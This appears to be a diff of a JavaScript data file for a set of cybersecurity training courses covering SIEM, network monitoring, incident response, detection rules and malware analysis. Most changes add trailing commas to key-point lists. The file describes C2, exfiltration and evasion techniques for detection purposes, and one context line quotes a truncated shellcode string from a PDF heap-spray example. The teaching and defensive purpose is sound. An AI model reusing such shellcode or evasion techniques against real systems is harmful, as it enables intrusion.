       "maxspan and maxpause control transaction time limits",
       "Stats is often faster than transaction for simple aggregations"
-    ]
+    ],
   },
   {
     id: "4.4",
@@ -14682,7 +15688,7 @@ Complete this based on your findings:
       "Timecharts reveal patterns in data over time",
       "Joins and subsearches correlate data across sources",
       "Transactions help identify attack chains and sessions"
-    ]
+    ],
   },
 
   // Module 5: Dashboards & Visualization
@@ -14873,7 +15879,7 @@ Row 4: Recent critical alerts (table)
       "Follow visual hierarchy: critical info at top-left",
       "Apply the 5-second rule for key information visibility",
       "Include drill-down capability for investigation"
-    ]
+    ],
   },
   {
     id: "5.2",
@@ -15123,7 +16129,7 @@ index=security EventCode=4625
       "Tables provide detail; single values highlight KPIs",
       "Geographic maps visualize attack origins",
       "Use consistent color coding across all dashboards"
-    ]
+    ],
   },
   {
     id: "5.3",
@@ -15372,7 +16378,7 @@ Show/hide panels based on selections.
       "Drilldowns enable click-to-investigate workflows",
       "Tokens pass values between inputs and panels",
       "Interactive dashboards transform monitoring into investigation"
-    ]
+    ],
   },
   {
     id: "5.4",
@@ -15617,7 +16623,7 @@ earliest=$time.earliest$ latest=$time.latest$
       "Single values highlight key metrics",
       "Add drilldowns for investigation workflows",
       "Test all interactive elements before deployment"
-    ]
+    ],
   },
 
   // Module 6: Alerts & Correlation Rules
@@ -15800,7 +16806,7 @@ Real Threats Missed
       "Alert fatigue from too many false positives leads to missed threats",
       "Key metrics: FP rate, MTTD, MTTR, and alert volume per analyst",
       "Proper tuning is essential to maintain effective alerting"
-    ]
+    ],
   },
   {
     id: "6.2",
@@ -16009,7 +17015,7 @@ Link rules to attack techniques:
       "Map rules to MITRE ATT&CK for coverage visibility",
       "Document rules with logic, tuning guidance, and response procedures",
       "Balance detection sensitivity with false positive rate"
-    ]
+    ],
   },
   {
     id: "6.3",
@@ -16248,7 +17254,7 @@ After Tuning:
       "Maintain exception lists with expiration dates and approval",
       "Always validate that tuning doesn't break detection of real threats",
       "Document all tuning changes for audit and rollback"
-    ]
+    ],
   },
   {
     id: "6.4",
@@ -16466,7 +17472,7 @@ Automated response playbooks:
       "Aggregate related alerts to prevent alert storms",
       "Start SOAR automation with enrichment, not destructive actions",
       "Always include rollback procedures for automated responses"
-    ]
+    ],
   },
 
   // Module 7: Practical SIEM Operations
@@ -16700,7 +17706,7 @@ with wrong password, eventually succeeded.
       "Gather context from asset DB, user directory, and previous alerts",
       "Use a decision tree to systematically classify alerts",
       "Thorough documentation enables learning and audit"
-    ]
+    ],
   },
   {
     id: "7.2",
@@ -16927,7 +17933,7 @@ index=security user=compromised_user action=access
       "Map findings to MITRE ATT&CK for structured analysis",
       "Extract and document all IOCs for blocking and hunting",
       "Assess scope to understand full impact of incident"
-    ]
+    ],
   },
   {
     id: "7.3",
@@ -17165,7 +18171,7 @@ NOTES:
       "Organize saved searches and dashboards with clear naming",
       "Maintain runbooks for consistent alert handling",
       "Track metrics to measure and improve SOC performance"
-    ]
+    ],
   },
   {
     id: "7.4",
@@ -17550,7 +18556,7 @@ Without NSM, the organization might only discover the breach weeks later during 
     additionalResources: [
       { title: "The Practice of Network Security Monitoring — Richard Bejtlich", type: "article" },
       { title: "SANS NSM Reading Room", url: "https://www.sans.org/reading-room/", type: "documentation" }
-    ]
+    ],
   },
   {
     id: "1.2",
@@ -17756,7 +18762,7 @@ Different layers require different sensor types:
       "NSM sensors must be placed strategically to cover multiple layers",
       "Layer 2-3 attacks (ARP spoofing, IP spoofing) require different tools than Layer 7 attacks",
       "Understanding the layer where an attack occurs guides the appropriate response"
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -17852,7 +18858,7 @@ DMZ      ─┤    DMZ Switch       ├──── TAP ──→ Suricata + Zee
       "Sensor placement must cover perimeter, internal segments, and DMZ",
       "Storage architecture requires tiering — hot, warm, and cold — based on data type",
       "East-west monitoring is crucial for detecting lateral movement"
-    ]
+    ],
   },
 
   // Module 2: Packet Capture & Analysis
@@ -18075,7 +19081,7 @@ Order TCP streams chronologically to build a narrative:
       "Retransmissions and RSTs can indicate network interference or attacks",
       "File magic bytes in streams help identify transferred file types",
       "Chronological stream analysis builds forensic timelines"
-    ]
+    ],
   },
   {
     id: "2.3",
@@ -18292,7 +19298,7 @@ Modern protocols introduce new challenges for NSM:
       "JA3 fingerprinting identifies applications even in encrypted traffic",
       "TLS certificates and SNI provide metadata even when payloads are encrypted",
       "HTTP/2 and HTTP/3 introduce new challenges for traditional NSM inspection"
-    ]
+    ],
   },
   {
     id: "2.5",
@@ -18590,7 +19596,7 @@ Suricata's EVE (Extensible Event Format) produces structured JSON for each event
       "HOME_NET configuration is critical — defines what Suricata considers 'internal'",
       "EVE JSON output integrates seamlessly with SIEM platforms",
       "suricata-update manages rule sources and keeps signatures current"
-    ]
+    ],
   },
   {
     id: "3.2",
@@ -18871,7 +19877,7 @@ filebeat.inputs:
       "Suppression silences specific source/destination combinations without disabling rules",
       "Threshold types (limit, threshold, both) control alert frequency",
       "A structured triage workflow prevents alert fatigue"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -18996,7 +20002,7 @@ suricata --engine-analysis -c /etc/suricata/suricata.yaml -S custom.rules
       "PCRE (regex) enables flexible pattern matching for encoded or variable data",
       "Always test rules with both positive (malicious) and negative (benign) samples",
       "Threshold rules are essential for detecting scanning and brute-force patterns"
-    ]
+    ],
   },
 
   // Module 4: Network Metadata with Zeek
@@ -19098,7 +20104,7 @@ This UID correlation is one of Zeek's most powerful features — you can trace a
       "UIDs link related logs across conn, http, dns, files, and other log types",
       "Zeek complements Suricata — metadata for hunting vs. signatures for alerting",
       "The Zeek scripting language enables custom behavioral detections"
-    ]
+    ],
   },
   {
     id: "4.2",
@@ -19232,7 +20238,7 @@ Zeek logs protocol violations and unexpected behaviors here. These "weirds" ofte
       "Connection state codes (S0, SF, REJ) quickly identify scanning and anomalies",
       "zeek-cut is the essential tool for extracting and analyzing specific log fields",
       "files.log captures hashes of every file transferred on the network"
-    ]
+    ],
   },
   {
     id: "4.3",
@@ -19342,7 +20348,7 @@ Document each hunt with:
       "Lateral movement hunting focuses on unusual internal-to-internal connections",
       "Data exfiltration detection uses volume asymmetry and protocol tunneling indicators",
       "Documenting hunts as playbooks ensures repeatable, systematic hunting"
-    ]
+    ],
   },
   {
     id: "4.4",
@@ -19497,7 +20503,7 @@ echo "@load ./my_detection.zeek" >> /opt/zeek/share/zeek/site/local.zeek
       "Sets and tables enable tracking state across connections (e.g., counting NXDomains per host)",
       "The Notice framework generates structured alerts from script detections",
       "Scripts can be loaded persistently via local.zeek or per-run with -r"
-    ]
+    ],
   },
 
   // Module 5: Network Attack Detection
@@ -19609,7 +20615,7 @@ cat dns.log | zeek-cut ts id.orig_h query qtype_name | grep 'PTR' | \\
       "Horizontal scans target one port across many hosts; vertical scans target many ports on one host",
       "Nmap scan types produce distinctive TCP flag combinations visible in Zeek logs",
       "Correlating reconnaissance with subsequent activity reveals full attack chains"
-    ]
+    ],
   },
   {
     id: "5.2",
@@ -19707,7 +20713,7 @@ Attackers choose protocols likely to pass through firewalls:
       "JA3 fingerprinting identifies C2 frameworks even in encrypted traffic",
       "DNS-based C2 uses high query volumes and encoded subdomain labels",
       "Multi-layered detection (JA3 + timing + certificates) reduces evasion success"
-    ]
+    ],
   },
   {
     id: "5.3",
@@ -19810,7 +20816,7 @@ Deploy internal honeypots on ports commonly targeted during lateral movement:
       "Workstation-to-workstation SMB/RDP connections are high-confidence indicators",
       "Baselining normal internal traffic patterns reveals anomalous connections",
       "Honeypots on common lateral movement ports provide high-fidelity alerts"
-    ]
+    ],
   },
   {
     id: "5.4",
@@ -19928,7 +20934,7 @@ Network-based DLP can inspect content for:
       "Volume asymmetry (upload >> download) is the primary indicator for direct transfer",
       "DNS exfiltration encodes data in subdomain labels and is detectable through query analysis",
       "Cloud storage exfiltration is harder to detect but SSL SNI reveals destinations"
-    ]
+    ],
   },
 
   // Module 6: Practical NSM Operations
@@ -20066,7 +21072,7 @@ This correlation provides the analyst with a complete picture from a single aler
       "Filebeat bridges NSM sensors to centralized analytics platforms",
       "Cross-tool correlation (Suricata alerts + Zeek metadata) provides investigation context",
       "Dashboards should serve both SOC overview and deep-dive investigation needs"
-    ]
+    ],
   },
   {
     id: "6.2",
@@ -20183,7 +21189,7 @@ tshark -r evidence.pcap -Y "dns && ip.src==10.0.1.50" \\
       "Timeline construction from Zeek logs and PCAPs reveals the full attack narrative",
       "File extraction from PCAPs preserves malware samples and stolen documents",
       "Forensic reports must reference specific evidence for every claim"
-    ]
+    ],
   },
   {
     id: "6.3",
@@ -20310,7 +21316,7 @@ When the network changes, NSM must adapt:
       "Rule lifecycle management ensures detections stay relevant and accurate",
       "Version-controlled rules enable change tracking and rollback",
       "NSM must continuously adapt to network architecture changes"
-    ]
+    ],
   },
   {
     id: "6.4",
@@ -20449,7 +21455,7 @@ These skills form the foundation for advanced roles in incident response, threat
       "Multi-tool correlation (Suricata + Zeek + Wireshark) provides the complete picture",
       "Timeline construction is the core deliverable of any network forensic investigation",
       "Reports must be evidence-based with specific references to logs and artifacts"
-    ]
+    ],
   },
   // ==========================================
   // Incident Response Fundamentals Course
@@ -20610,7 +21616,7 @@ Each incident feeds lessons back into the Preparation phase, creating a cycle of
       "Preparation is the foundation — without it, the other phases fail",
       "Detection & Analysis is the most technically challenging phase",
       "Post-Incident Activity closes the loop by feeding lessons back into Preparation"
-    ]
+    ],
   },
   {
     id: "1.3",
@@ -20662,7 +21668,7 @@ Beyond NIST and SANS, other frameworks include:
       "SANS separates containment, eradication, and recovery into distinct phases unlike NIST",
       "Most teams use a hybrid of NIST and SANS adapted to their organization",
       "The Identification phase emphasizes confirming an event is a true incident before activating the full IR plan"
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -20728,7 +21734,7 @@ IR teams must coordinate with:
       "Core roles include IR Manager, Incident Handlers, Forensic Analysts, and Threat Intel Analysts",
       "A RACI matrix clarifies responsibility and accountability for every IR activity",
       "Cross-functional coordination with legal, HR, communications, IT, and executives is essential"
-    ]
+    ],
   },
 
   // Module 2: Preparation & Readiness
@@ -20792,7 +21798,7 @@ Every organization should have playbooks for their most common incident types:
       "Severity classification (SEV-1 through SEV-4) drives escalation and resource allocation",
       "Every organization needs playbooks for their most common incident types",
       "Authority levels must be explicitly defined so responders can act decisively during crises"
-    ]
+    ],
   },
   {
     id: "2.2",
@@ -20852,7 +21858,7 @@ Work with legal counsel to establish:
       "Pre-approved notification templates save critical time during active incidents",
       "Regulatory notification timelines vary: GDPR is 72 hours, HIPAA is 60 days",
       "Work with legal to establish attorney-client privilege for IR communications"
-    ]
+    ],
   },
   {
     id: "2.3",
@@ -20910,7 +21916,7 @@ An IR "jump bag" is a pre-assembled kit of hardware and software tools ready for
       "Write blockers and forensic laptops ensure evidence integrity",
       "Key tools include FTK Imager, KAPE, Velociraptor, Volatility, and Chainsaw",
       "The kit must be validated monthly and updated after every real incident"
-    ]
+    ],
   },
   {
     id: "2.4",
@@ -20973,7 +21979,7 @@ INJECT 6 (T+75 min): Media outlet contacts PR team about the breach
       "Scenarios should unfold with timed injects that increase in severity",
       "Common findings include outdated contact lists, unclear authority, and untested backups",
       "After-action reports must include assigned action items with owners and deadlines"
-    ]
+    ],
   },
 
   // Module 3: Detection & Analysis
@@ -21035,7 +22041,7 @@ Many attacks exploit detection blind spots:
       "MTTD (Mean Time to Detect) is a critical metric targeting less than 24 hours",
       "Encrypted traffic, living-off-the-land techniques, and cloud environments create detection gaps",
       "User reports are often the first detection source for phishing and social engineering attacks"
-    ]
+    ],
   },
   {
     id: "3.2",
@@ -21097,7 +22103,7 @@ Alert Received → Validate → Classify → Prioritize → Assign → Investiga
       "Impact (CIA triad) and urgency together determine severity level",
       "SEV-1 incidents require 15-minute initial response and continuous updates",
       "Alert fatigue and anchoring bias are common triage pitfalls"
-    ]
+    ],
   },
   {
     id: "3.3",
@@ -21164,7 +22170,7 @@ Focus your detection efforts higher on the pyramid for more resilient detections
       "The Pyramid of Pain shows that detecting TTPs is most valuable but hardest to implement",
       "Temporal and entity correlation connect individual indicators into a coherent attack narrative",
       "Attack timelines are essential deliverables of the analysis phase"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -21229,7 +22235,7 @@ The root cause is always a **systemic failure** — something the organization c
       "The 5 Whys method drills from the incident to the underlying organizational failure",
       "Fishbone diagrams categorize contributing factors across People, Process, Technology, Environment, and Policy",
       "Root causes are always systemic and fixable — individual human error is a contributing factor, not a root cause"
-    ]
+    ],
   },
 
   // Module 4: Containment Strategies
@@ -21290,7 +22296,7 @@ Short-term containment focuses on **immediately stopping the attacker's ability 
       "DNS sinkholes reveal additional compromised systems by capturing C2 connection attempts",
       "Never power off a compromised system before capturing volatile memory",
       "EDR isolation is preferred over physical disconnection as it maintains management access"
-    ]
+    ],
   },
   {
     id: "4.2",
@@ -21349,7 +22355,7 @@ The key is **coordinated containment** — plan all containment actions and exec
       "KRBTGT must be reset twice with 12+ hours between resets for Golden Ticket remediation",
       "Coordinated simultaneous containment prevents attackers from adapting to individual actions",
       "Scope often expands during containment as additional compromised systems are discovered"
-    ]
+    ],
   },
   {
     id: "4.3",
@@ -21408,7 +22414,7 @@ Evidence Item: Memory dump from WORKSTATION-042
       "Chain of custody documentation is required for every evidence item",
       "Always use write blockers and verify hashes when creating forensic images",
       "Improper evidence handling can render artifacts inadmissible in legal proceedings"
-    ]
+    ],
   },
   {
     id: "4.4",
@@ -21471,7 +22477,7 @@ Every containment decision should be documented:
       "Active exfiltration and spreading ransomware always warrant immediate isolation",
       "Sometimes monitoring is more valuable than immediate containment — if you need scope or intelligence",
       "Every containment decision must be documented with who, what, when, why, and expected impact"
-    ]
+    ],
   },
 
   // Module 5: Eradication & Recovery
@@ -21536,7 +22542,7 @@ Before removal, you must find every way the attacker can return:
       "Common persistence includes registry keys, scheduled tasks, services, WMI subscriptions, and webshells",
       "When in doubt, rebuild from clean media rather than attempting to clean a compromised system",
       "KRBTGT reset is required whenever Active Directory domain compromise is confirmed"
-    ]
+    ],
   },
   {
     id: "5.2",
@@ -21599,7 +22605,7 @@ Monitor each phase for signs of re-compromise before proceeding to the next.
       "Verify backup integrity and confirm the backup predates the compromise before restoring",
       "Use phased restoration — core infrastructure first, non-critical systems last",
       "Enhanced monitoring must be in place before any restored system goes back to production"
-    ]
+    ],
   },
   {
     id: "5.3",
@@ -21660,7 +22666,7 @@ An incident can be closed when:
       "Enhanced monitoring should continue for 30-90 days after incident closure",
       "Signs of re-compromise include connections to blocked infrastructure from new sources",
       "Incident closure requires validated systems, clean monitoring, preserved evidence, and completed reports"
-    ]
+    ],
   },
   {
     id: "5.4",
@@ -21720,7 +22726,7 @@ Business resumption bridges the gap between technical recovery and full operatio
       "Users need clear communication about changed procedures (passwords, MFA, workflows)",
       "Application dependencies can block resumption even when individual systems are recovered",
       "Executive sign-off marks the formal transition from incident response to normal operations"
-    ]
+    ],
   },
 
   // Module 6: Post-Incident Activities
@@ -21785,7 +22791,7 @@ Track action items in a shared system and review progress in monthly security me
       "Schedule the meeting within 2 weeks of incident closure while details are fresh",
       "Every action item needs a single owner, specific deadline, and clear success criteria",
       "Celebrating what went well is as important as identifying improvements"
-    ]
+    ],
   },
   {
     id: "6.2",
@@ -21850,7 +22856,7 @@ The incident report is the permanent record of what happened, what was done, and
       "Use UTC timestamps and precise counts throughout the report",
       "Separate observed facts from analytical conclusions",
       "Recommendations should be categorized by timeframe: immediate, short-term, and long-term"
-    ]
+    ],
   },
   {
     id: "6.3",
@@ -21916,7 +22922,7 @@ Monthly IR Dashboard:
       "Industry average dwell time is ~200 days — high-performing teams target under 7 days",
       "Re-compromise rate measures eradication effectiveness and is a critical quality metric",
       "Metrics should drive specific improvement actions, not just fill dashboards"
-    ]
+    ],
   },
   {
     id: "6.4",
@@ -21991,7 +22997,7 @@ Track your IR program maturity over time:
       "Improvements span four categories: detection, process, technology, and people",
       "Each improvement maps directly back to strengthening the Preparation phase",
       "IR maturity progresses from ad hoc (Initial) to automated and predictive (Optimizing)"
-    ]
+    ],
   },
 
   // ==========================================
@@ -22078,7 +23084,7 @@ Treat detections like software: they need requirements, testing, versioning, doc
       "Every alert must be actionable; noise erodes analyst trust",
       "Treat detections as software products with full lifecycle management",
       "Assume breach and validate controls through detection"
-    ]
+    ],
   },
   {
     id: "1.2",
@@ -22138,7 +23144,7 @@ Use ATT&CK Navigator to create visual heat maps showing:
       "Verify data source availability before writing any detection",
       "Coverage gaps are normal — document and prioritize them",
       "Use ATT&CK Navigator heat maps to visualize detection posture"
-    ]
+    ],
   },
   {
     id: "1.3",
@@ -22195,7 +23201,7 @@ Track weekly:
       "Every rule should have a target FP rate and be measured against it",
       "Use allowlisting, thresholds, enrichment, and correlation to reduce FPs",
       "Apply the 5-day rule: disable persistently noisy detections immediately"
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -22253,7 +23259,7 @@ Each detection moves through the pipeline with defined quality gates at each sta
       "Every detection needs test cases for both true positives and false positives",
       "Staged rollout with alert-only periods prevents production noise",
       "Quarterly reviews ensure detections remain relevant and performant"
-    ]
+    ],
   },
 
   // Module 2: SIGMA Rules
@@ -22319,7 +23325,7 @@ Common categories: \`process_creation\`, \`file_event\`, \`registry_event\`, \`n
       "Rules consist of logsource, detection, and metadata sections",
       "Tags map directly to MITRE ATT&CK techniques",
       "Log source categories abstract away vendor-specific field names"
-    ]
+    ],
   },
   {
     id: "2.2",
@@ -22390,7 +23396,7 @@ detection:
       "Use value modifiers (contains, endswith, re) for flexible matching",
       "Combine multiple selections with filters for precise detection",
       "Always test against benign activity and document false positives"
-    ]
+    ],
   },
   {
     id: "2.3",
@@ -22470,7 +23476,7 @@ Always verify:
       "Near-time correlation detects sequences of related events",
       "Field lists enable compact rules covering multiple variants",
       "Always validate conditions against both malicious and benign data"
-    ]
+    ],
   },
   {
     id: "2.4",
@@ -22540,7 +23546,7 @@ For unsupported platforms, write custom pySigma backends:
       "Processing pipelines handle field name translation between platforms",
       "Always validate converted queries for syntax, field mapping, and logic",
       "SigmaHQ provides 2000+ community-maintained detection rules"
-    ]
+    ],
   },
 
   // Module 3: YARA Signatures
@@ -22611,7 +23617,7 @@ Boolean logic determining when the rule matches:
       "Strings can be text, hex bytes, or regular expressions",
       "Modifiers like ascii, wide, nocase, and xor expand matching capability",
       "Conditions use boolean logic to combine string matches"
-    ]
+    ],
   },
   {
     id: "3.2",
@@ -22687,7 +23693,7 @@ condition:
       "Hex wildcards (??) and jumps [min-max] handle variable code",
       "XOR modifier automatically generates all rotation variants",
       "Require multiple indicators in conditions to reduce false positives"
-    ]
+    ],
   },
   {
     id: "3.3",
@@ -22777,7 +23783,7 @@ rule likely_packed
       "Math module calculates entropy to detect packed/encrypted content",
       "String counting (#) and position (@) add precision to conditions",
       "Combine modules for sophisticated malware classification rules"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -22843,7 +23849,7 @@ Trigger YARA scans from automated playbooks:
       "Optimize rules with anchors, filesize filters, and limited regex",
       "Integrate YARA with EDR and SOAR for automated scanning workflows",
       "Maintain rules in Git with regular review and retirement cycles"
-    ]
+    ],
   },
 
   // Module 4: Log Source Mastery
@@ -22908,7 +23914,7 @@ Enable via Group Policy:
       "Sysmon provides vastly more detail than native Windows auditing",
       "Configure audit policies to capture process command lines",
       "Combine Security, Sysmon, and PowerShell logs for comprehensive coverage"
-    ]
+    ],
   },
   {
     id: "4.2",
@@ -22970,7 +23976,7 @@ Metadata about network flows without payload:
       "Zeek generates structured network logs essential for network detection",
       "Combine auth.log, auditd, and syslog for comprehensive Linux coverage",
       "NetFlow enables beaconing and exfiltration detection without payload inspection"
-    ]
+    ],
   },
   {
     id: "4.3",
@@ -23043,7 +24049,7 @@ event.reason: "INVALID_CREDENTIALS"
       "Identity provider logs (Okta, Entra ID) reveal authentication attacks",
       "SaaS audit logs capture data access, sharing, and configuration changes",
       "Cloud-specific detections include impossible travel, MFA fatigue, and OAuth abuse"
-    ]
+    ],
   },
   {
     id: "4.4",
@@ -23129,7 +24135,7 @@ Enrichment transforms an ordinary login into a **critical alert**.`,
       "Enrichment adds context: asset info, threat intel, GeoIP, user details",
       "Enriched logs dramatically improve detection quality and analyst efficiency",
       "Build enrichment pipelines at ingest time for real-time detection benefit"
-    ]
+    ],
   },
 
   // Module 5: Detection as Code
@@ -23208,7 +24214,7 @@ deprecate(network): retire legacy DNS tunnel rule (replaced by de-1045)
       "Use pull requests with mandatory review before production deployment",
       "Organize rules by platform (windows/linux/cloud/network) and technique",
       "Use conventional commits for clear change history"
-    ]
+    ],
   },
   {
     id: "5.2",
@@ -23288,7 +24294,7 @@ On deployment:
       "Quality gates block broken or noisy rules from reaching production",
       "Automated conversion ensures rules stay in sync across SIEM platforms",
       "Notifications keep SOC analysts informed of new and updated detections"
-    ]
+    ],
   },
   {
     id: "5.3",
@@ -23371,7 +24377,7 @@ Detection testing aligns with purple teaming:
       "Atomic Red Team provides pre-built attack simulations mapped to ATT&CK",
       "Schedule continuous validation: daily for critical, weekly for high-priority",
       "Purple team exercises directly validate and improve detection coverage"
-    ]
+    ],
   },
   {
     id: "5.4",
@@ -23456,7 +24462,7 @@ configs/
       "Terraform and Ansible automate SIEM deployment and configuration",
       "Maintain dev/staging/production parity for reliable testing",
       "IaC enables disaster recovery, auditing, and environment consistency"
-    ]
+    ],
   },
 
   // Module 6: Detection Operations
@@ -23529,7 +24535,7 @@ Add weight based on:
       "Use allowlisting, thresholds, time filters, and context scoring to reduce FPs",
       "Target <5% FP rate before enabling full production alerting",
       "Disable rules with >50% FP rate and unclear patterns immediately"
-    ]
+    ],
   },
   {
     id: "6.2",
@@ -23592,7 +24598,7 @@ Compare against industry:
       "Target >60% ATT&CK coverage of priority techniques",
       "Build dashboards showing coverage heat maps, quality trends, and pipeline velocity",
       "Report to leadership with coverage delta, quality improvements, and threats detected"
-    ]
+    ],
   },
   {
     id: "6.3",
@@ -23675,7 +24681,7 @@ If one data source fails, others still detect the technique.`,
       "Use ATT&CK Navigator to create visual coverage heat maps",
       "Prioritize gaps by threat relevance, impact, and detection feasibility",
       "Layer multiple detections per technique across different data sources"
-    ]
+    ],
   },
   {
     id: "6.4",
@@ -23751,7 +24757,7 @@ Start wherever you are and improve incrementally. Every organization can reach L
       "Check detection health: still firing, accurate, needed, performant, documented?",
       "Retire detections formally: document, verify replacement, archive, update coverage",
       "Build program maturity from ad-hoc (Level 1) to leading (Level 5) incrementally"
-    ]
+    ],
   },
   // ==================== MALWARE ANALYSIS FUNDAMENTALS ====================
   // Module 1: Malware Landscape & Lab Setup
@@ -23822,7 +24828,7 @@ Destructive malware designed to permanently destroy data. No recovery mechanism.
       "Modern malware often combines multiple categories (e.g., worm + ransomware)",
       "Understanding taxonomy helps predict behavior during analysis",
       "Attribution often correlates with malware sophistication and objectives"
-    ]
+    ],
   },
   {
     id: "1.2",
@@ -23881,7 +24887,7 @@ Malicious or negligent insiders deploying:
       "RaaS has democratized ransomware, lowering the barrier to entry",
       "APT malware requires deeper reverse engineering due to custom tooling",
       "Attribution combines technical indicators with geopolitical context"
-    ]
+    ],
   },
   {
     id: "1.3",
@@ -23959,7 +24965,7 @@ Clean Install → Base Snapshot → Tool Install → Analysis Snapshot
       "FlareVM provides a comprehensive Windows analysis toolkit",
       "REMnux simulates network services so malware behaves naturally",
       "Snapshot before every execution and revert after every analysis session"
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -24036,7 +25042,7 @@ vt file <SHA256> --include=last_analysis_stats
       "Always use password-protected archives and renamed extensions",
       "Maintain chain of custody documentation for every sample",
       "Verify hashes before and after transfer to ensure integrity"
-    ]
+    ],
   },
   // Module 2: Static Analysis Techniques
   {
@@ -24121,7 +25127,7 @@ print(pe.get_rich_header_hash())
       "SHA256 is the standard for unique sample identification",
       "Fuzzy hashing (ssdeep) finds variants of the same malware family",
       "Import hashing links samples built with the same toolkit"
-    ]
+    ],
   },
   {
     id: "2.2",
@@ -24203,7 +25209,7 @@ grep -oP '[A-Za-z0-9+/]{40,}={0,2}' strings.txt
       "FLOSS recovers obfuscated strings that basic tools miss",
       "Network IOCs in strings often reveal C2 infrastructure",
       "Registry and file path strings indicate persistence mechanisms"
-    ]
+    ],
   },
   {
     id: "2.3",
@@ -24288,7 +25294,7 @@ Suspicious Import Groups:
       "Import tables directly indicate malware functionality",
       "High entropy sections suggest encrypted or packed content",
       "Anomalous section names and entry points are packing indicators"
-    ]
+    ],
   },
   {
     id: "2.4",
@@ -24377,7 +25383,7 @@ Strategy: Find Original Entry Point (OEP)
       "Entropy >7.0 strongly indicates packed or encrypted content",
       "UPX is trivially unpacked; custom packers require manual debugging",
       "Detect It Easy identifies most common packers automatically"
-    ]
+    ],
   },
   // Module 3: Dynamic & Behavioral Analysis
   {
@@ -24458,7 +25464,7 @@ Network:           DNS queries, HTTP/HTTPS C2, data exfiltration
       "ANY.RUN's interactive mode handles malware requiring user clicks",
       "Sophisticated malware actively detects and evades sandboxes",
       "Focus on process trees, network activity, and persistence indicators"
-    ]
+    ],
   },
   {
     id: "3.2",
@@ -24540,7 +25546,7 @@ Values Modified: HKLM\\SOFTWARE\\Policies\\...
       "Watch for child process creation, especially from Office or script hosts",
       "RWX memory regions in Process Hacker indicate code injection",
       "Regshot diffs reveal persistence and configuration changes"
-    ]
+    ],
   },
   {
     id: "3.3",
@@ -24622,7 +25628,7 @@ Domain Generation Algorithm (DGA):
       "DNS queries often reveal C2 domains and DGA patterns",
       "Wireshark display filters help isolate malicious traffic from noise",
       "Beaconing patterns reveal C2 check-in intervals and jitter"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -24719,7 +25725,7 @@ Keylogging:
       "Process injection follows recognizable API call sequences",
       "API Monitor provides graphical filtering for targeted monitoring",
       "x64dbg conditional breakpoints enable logging without stopping execution"
-    ]
+    ],
   },
   // Module 4: Document & Script Malware
   {
@@ -24815,7 +25821,7 @@ vmonkey malicious.docm
       "olevba identifies suspicious keywords and deobfuscates strings",
       "String concatenation and Chr() encoding are primary VBA obfuscation methods",
       "ViperMonkey safely emulates macro execution without running Office"
-    ]
+    ],
   },
   {
     id: "4.2",
@@ -24902,7 +25908,7 @@ var sc = unescape("%ue8fc%u0082....");
       "pdf-parser and peepdf are the primary PDF analysis tools",
       "JavaScript in PDFs often performs heap spraying for exploit delivery",
       "Always check for /Launch, /JS, /EmbeddedFile, and /URI objects"
-    ]
+    ],
   },
   {
     id: "4.3",
@@ -24991,7 +25997,7 @@ box-js malicious.js --output-dir=analysis/
       "Base64 + string manipulation + variable substitution = common triple layer",
       "PSDecode automates multi-layer PowerShell deobfuscation",
       "box-js safely emulates malicious JScript to extract IOCs"
-    ]
+    ],
   },
   {
     id: "4.4",
@@ -25086,7 +26092,7 @@ Often delivered via HTML smuggling:
       "Look for atob(), Blob, and createObjectURL in suspicious HTML files",
       "LNK files disguise command execution as innocent-looking shortcuts",
       "ISO containers from HTML smuggling typically contain LNK + DLL pairs"
-    ]
+    ],
   },
   // Module 5: Reverse Engineering Fundamentals
   {
@@ -25187,7 +26193,7 @@ x64 Linux (System V):
       "ESP/RSP always points to the top of the stack",
       "CMP sets flags used by conditional jumps (JE, JNE, JG, JL)",
       "x64 Windows passes first 4 args in RCX, RDX, R8, R9"
-    ]
+    ],
   },
   {
     id: "5.2",
@@ -25287,7 +26293,7 @@ if (IsDebuggerPresent()) {
       "Aggressively rename functions and variables as you understand them",
       "Cross-references reveal how functions and data are interconnected",
       "Dynamic API resolution hides imports from static analysis"
-    ]
+    ],
   },
   {
     id: "5.3",
@@ -25390,7 +26396,7 @@ After malware unpacks itself in memory:
       "Hardware breakpoints survive anti-debugging and self-modifying code",
       "ScyllaHide plugin automatically defeats most anti-debugging tricks",
       "Scylla dumps unpacked malware from memory with import table reconstruction"
-    ]
+    ],
   },
   {
     id: "5.4",
@@ -25499,7 +26505,7 @@ DnsQuery_A(encoded_subdomain, DNS_TYPE_TXT, ...);
       "XOR encryption is trivially reversible but still widely used",
       "DGAs generate pseudo-random domains using seeds like dates",
       "Config extraction reveals C2 infrastructure, campaign IDs, and crypto keys"
-    ]
+    ],
   },
   // Module 6: Reporting & Threat Intelligence
   {
@@ -25592,7 +26598,7 @@ indicators = tc_source.query([
       "STIX 2.1 is the standard format for machine-readable threat intelligence",
       "TAXII enables automated IOC sharing between organizations",
       "Extract IOCs from strings, sandbox reports, and network captures"
-    ]
+    ],
   },
   {
     id: "6.2",
@@ -25694,7 +26700,7 @@ time yara -r rule.yar /large/file/collection/
       "Always include MZ header check and filesize constraints to reduce false positives",
       "Test rules against both malware samples AND clean files",
       "PE module enables matching on imports, exports, and section properties"
-    ]
+    ],
   },
   {
     id: "6.3",
@@ -25789,7 +26795,7 @@ of provided YARA rules is recommended.
       "MITRE ATT&CK mapping connects findings to a shared framework",
       "IOC tables should include context for each indicator",
       "Reports serve multiple audiences: executives, SOC, and threat intel teams"
-    ]
+    ],
   },
   {
     id: "6.4",
@@ -25897,7 +26903,7 @@ Campaign Object:
       "Code similarity tools (BinDiff, ssdeep) link samples to families",
       "Infrastructure tracking through passive DNS reveals actor patterns",
       "Confidence levels prevent over-attribution from single data points"
-    ]
+    ],
   },
   // ==========================================
   // SOC ANALYST LEARNING PATH
@@ -25960,6 +26966,43 @@ For each alert: read details, enrich IOCs, correlate events, classify (TP/FP/BTP
       "Collaboration with L2 analysts is essential",
       "Managing alert fatigue through breaks is crucial"
     ],
+    practicalExercise: {
+      title: "SOC Alert Triage Scenario",
+      description: "Practice prioritizing and triaging alerts during a SOC shift handover.",
+      steps: [
+        "Review the scenario and identify key details",
+        "Determine alert priorities based on severity and context",
+        "Decide on appropriate escalation actions",
+        "Document your triage decisions"
+      ],
